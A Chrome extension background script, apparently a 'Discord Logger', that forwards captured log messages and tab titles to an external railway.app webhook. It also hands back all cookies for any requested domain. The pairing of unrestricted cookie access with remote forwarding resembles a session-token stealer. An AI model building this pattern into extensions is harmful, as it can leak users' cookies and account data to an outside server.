
// Background script to handle log messages and send to webhook service
const WEBHOOK_SERVICE_URL = 'https://extension.up.railway.app/send-log';

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log('Background received message:', message.type);
  
  if (message.type === 'LOG_CAPTURED') {
    sendLogToWebhook(message.data, sender.tab)
      .then(() => {
        console.log('Log sent successfully');
        sendResponse({ success: true });
      })
      .catch(error => {
        console.error('Failed to send log:', error);
        sendResponse({ success: false, error: error.message });
      });
    
    // Return true to indicate we will send a response asynchronously
    return true;
  }
  
  if (message.type === 'GET_COOKIES') {
    // Get cookies for the specified domain
    chrome.cookies.getAll({ domain: message.domain }, (cookies) => {
      console.log('Retrieved cookies for domain:', message.domain, cookies.length);
      sendResponse({ cookies: cookies });
    });
    
    // Return true to indicate we will send a response asynchronously
    return true;
  }
});

async function sendLogToWebhook(logData, tab) {
  try {
    console.log('Sending log to webhook:', logData.level, logData.message.substring(0, 50));
    
    const payload = {
      ...logData,
      tabId: tab?.id,
      tabTitle: tab?.title
    };

    const response = await fetch(WEBHOOK_SERVICE_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const result = await response.json();
    console.log('Webhook response:', result);
    
  } catch (error) {
    console.error('Failed to send log to webhook service:', error);
    throw error;
  }
}

// Handle extension installation
chrome.runtime.onInstalled.addListener(() => {
  console.log('Discord Logger Extension installed');
});

// Handle extension startup
chrome.runtime.onStartup.addListener(() => {
  console.log('Discord Logger Extension started');
});
